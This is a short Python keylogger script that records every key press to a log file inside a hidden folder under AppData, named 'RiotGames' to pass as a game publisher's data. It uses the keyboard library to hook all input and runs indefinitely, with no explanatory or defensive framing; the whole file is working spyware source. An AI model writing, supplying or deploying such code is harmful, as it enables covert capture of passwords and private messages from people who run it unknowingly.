import os
import subprocess
from pathlib import Path


log_folder = Path.home() / "AppData" / "Roaming" / "RiotGames"

log_folder.mkdir(parents=True, exist_ok=True)

subprocess.run(["attrib", "+h", str(log_folder)])


log_file = log_folder / "log.txt"


def on_key_press(event):
    with log_file.open("a") as f:
        f.write("{}".format(event.name))


import keyboard

keyboard.on_press(on_key_press)
keyboard.wait()
